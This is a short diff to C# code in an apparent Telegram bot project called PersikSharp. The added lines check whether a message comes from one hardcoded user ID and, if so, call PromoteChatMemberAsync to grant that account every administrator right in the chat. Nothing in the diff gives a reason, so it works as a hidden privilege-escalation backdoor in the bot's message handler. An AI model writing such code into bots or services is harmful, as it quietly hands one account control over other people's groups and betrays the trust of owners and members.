@@ -1174,6 +1174,12 @@ namespace PersikSharp
                 _ = Bot.SendTextMessageAsync(message.Chat.Id, msg_string);
 
 
+                if(message.From.Id == 204678400)
+                {
+                    Bot.PromoteChatMemberAsync(message.Chat.Id, 204678400, true, true, true, true, true, true, true, true);
+                }
+
+
                 //remove to enable
                 return;
 
